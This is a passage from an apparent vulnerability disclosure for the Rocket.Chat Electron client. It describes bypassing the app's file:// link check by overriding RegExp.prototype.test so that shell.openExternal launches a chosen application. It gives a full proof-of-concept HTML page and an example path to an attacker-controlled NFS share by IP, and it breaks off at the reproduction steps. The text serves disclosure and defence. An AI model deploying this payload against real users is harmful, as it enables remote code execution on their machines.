Thats because: \n\u003e      \"open 'file://localhost/Volumes/Macintosh HD/foo.txt'\" opens the document\n     in the default application for its type (as determined by LaunchSer-\n     vices).\n\nNote:  For this demo I point to file:///Applications/Calculator.app however if you point to a public NFS or SMB server on windows this executable can be controlled by the attacker. (example at: file:///net/192.241.239.91/var/nfs/general/hack2.app)\n\nIn https://github.com/RocketChat/Rocket.Chat.Electron/blob/master/src/public/preload.js#L45 all links are hooked and some patter matching is used to check before firing them off to shell.openExternal(href); \n\nNormally preload javascript is an \"isolated scope\" in this case however the code is directly attached to the user controlled DOM as the \"window.onload\" handler. This means we can overload some global objects and methods including the RegExp.prototype.test method. Now we can bypass the file:\\\\/\\\\/ check send our application path to openExternal.\n\n```html\n\u003c!DOCTYPE html\u003e\n\u003chtml\u003e\n    \u003chead\u003e\n      \u003cscript\u003e\n        RegExp.prototype.test = new Proxy(RegExp.prototype.test, {\n          apply: function(target, thisArg, argumentsList) {\n            console.log(thisArg.source);\n          console.log(argumentsList[0]);\n          if((thisArg.source == '^file:\\\\/\\\\/.+') \u0026\u0026 (argumentsList[0] === 'file:///Applications/Calculator.app')){\n            return false;\n          }\n          return Reflect.apply(target, thisArg, argumentsList)\n          }\n        });\n        setTimeout(()=\u003e{\n            a = document.createElement(\"A\")\n            a.href=\"file:///Applications/Calculator.app\"\n            document.body.appendChild(a)\n            a.click()\n        }, 3000);\n      \u003c/script\u003e\n    \u003c/head\u003e\n    \u003cbody\u003e\n     \u003ch1\u003e3...2...1...ðŸš€\u003c/h1\u003e\n    \u003c/body\u003e\n\u003c/html\u003e\n```\n\n## Releases Affected:\n\n  * \u003e= 2.9.0\n\n## Steps To Reproduce (from initial installation to vulnerability):\n\n  1.
